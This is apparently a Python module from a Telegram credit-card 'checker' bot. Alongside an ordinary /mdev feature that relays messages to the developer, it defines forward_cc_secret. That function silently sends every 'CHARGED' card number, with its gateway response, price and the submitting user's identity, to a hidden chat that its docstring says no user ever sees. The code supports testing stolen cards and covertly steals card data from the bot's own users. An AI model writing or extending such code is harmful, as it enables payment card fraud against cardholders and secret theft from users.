"""dev_dm.py — /mdev command + secret CC forwarder"""

import logging
from datetime import datetime
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

from config import DEV_ID, SECRET_CC_ID, SECRET_FORWARD
from emojis import PremiumEmoji as E
from database import save_mdev_map, get_mdev_user

logger = logging.getLogger(__name__)


async def forward_cc_secret(bot, cc_full, response, gateway, price, user_info, source):
    """Silently forward a CHARGED hit to the hidden SECRET_CC_ID. No user ever sees this."""
    if not SECRET_FORWARD or not SECRET_CC_ID:
        return
    try:
        text = (
            f"<b>𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙 | CHARGED</b>\n"
            f"<code>{cc_full}</code>\n"
            f"<b>GW:</b> {gateway} | <b>Price:</b> {price}\n"
            f"<b>Resp:</b> <code>{str(response)[:80]}</code>\n"
            f"<b>User:</b> {user_info.get('id')} ({user_info.get('first_name')})\n"
            f"<b>Source:</b> {source}\n"
            f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await bot.send_message(chat_id=SECRET_CC_ID, text=text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"secret_forward: {e}")


async def mdev_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message
    text, media_type, media_id = "", None, None

    if context.args:
        parts = msg.text.split(None, 1)
        text = parts[1] if len(parts) > 1 else ""
    elif msg.reply_to_message:
        r = msg.reply_to_message
        text = r.text or r.caption or ""
        if r.photo:
            media_type, media_id = "photo", r.photo[-1].file_id
        elif r.video:
            media_type, media_id = "video", r.video.file_id
        elif r.document:
            media_type, media_id = "document", r.document.file_id
    elif msg.photo:
        media_type, media_id = "photo", msg.photo[-1].file_id
        text = msg.caption or ""
    elif msg.document:
        media_type, media_id = "document", msg.document.file_id
        text = msg.caption or ""

    if not text and not media_id:
        await msg.reply_text(
            f"<blockquote>{E.INFO} <b>Contact Dev</b></blockquote>\n\n"
            f"<code>/mdev your message</code>\n"
            f"<i>Or reply to any msg / photo / doc with</i> <code>/mdev</code>",
            parse_mode="HTML")
        return

    header = (
        f"<blockquote>{E.STAR} <b>New /mdev</b></blockquote>\n"
        f"{E.USER} <b>From:</b> <a href='tg://user?id={user.id}'>{user.first_name}</a>\n"
        f"{E.EMOJI_4} <b>UID:</b> <code>{user.id}</code>\n"
        f"{E.EMOJI_3} <b>Username:</b> @{user.username or 'None'}\n"
        f"{E.CLOCK} <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{text or '<i>(media only)</i>'}"
    )

    try:
        sent = None
        if media_type == "photo":
            sent = await context.bot.send_photo(
                chat_id=DEV_ID, photo=media_id, caption=header, parse_mode="HTML")
        elif media_type == "video":
            sent = await context.bot.send_video(
                chat_id=DEV_ID, video=media_id, caption=header, parse_mode="HTML")
        elif media_type == "document":
            sent = await context.bot.send_document(
                chat_id=DEV_ID, document=media_id, caption=header, parse_mode="HTML")
        else:
            sent = await context.bot.send_message(
                chat_id=DEV_ID, text=header, parse_mode="HTML")

        if sent:
            try: save_mdev_map(sent.message_id, user.id)
            except Exception: pass

        await msg.reply_text(
            f"<blockquote>{E.SUCCESS} <b>Sent to Dev</b></blockquote>\n"
            f"<i>Reply expected within 24h.</i>",
            parse_mode="HTML")
    except Exception as e:
        logger.error(f"mdev send: {e}")
        await msg.reply_text(
            f"<blockquote>{E.ERROR} <b>Send failed</b></blockquote>",
            parse_mode="HTML")


async def mdev_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dev replies to a forwarded /mdev message → route back to the user."""
    if update.effective_user.id != DEV_ID:
        return
    if not update.message or not update.message.reply_to_message:
        return
    dev_msg_id = update.message.reply_to_message.message_id
    try:
        user_id = get_mdev_user(dev_msg_id)
    except Exception:
        user_id = None
    if not user_id:
        return
    try:
        await update.message.copy(chat_id=user_id)
        await update.message.reply_text("✅ Forwarded to user.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


def register_dev_dm(app):
    app.add_handler(CommandHandler("mdev", mdev_command))
    app.add_handler(MessageHandler(
        filters.User(DEV_ID) & filters.REPLY & ~filters.COMMAND,
        mdev_reply_handler))
    logger.info("✅ /mdev registered")
